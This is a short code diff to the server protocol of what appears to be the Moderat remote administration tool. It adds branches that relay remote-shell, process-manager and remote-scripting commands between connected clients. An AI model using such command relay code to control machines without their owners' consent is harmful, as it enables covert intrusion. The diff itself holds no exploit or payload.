@@ -64,7 +64,7 @@ class ModeratServerProtocol(Protocol):
 
     # New Connection Made
     def connectionMade(self):
-        self.send_message_to_client(self, 'connectSuccess', 'welcome')
+        self.send_message_to_client(self, 'connectSuccess', 'connectSuccess')
 
     def connectionLost(self, reason):
         global clients
@@ -385,6 +385,14 @@ class ModeratServerProtocol(Protocol):
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
         # Remote Shell
         elif data['mode'] == 'shellMode':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Processes Manager
+        elif data['mode'] == 'proccessMode':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Remote Scripting
+        elif data['mode'] == 'scriptingMode':
             log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
 
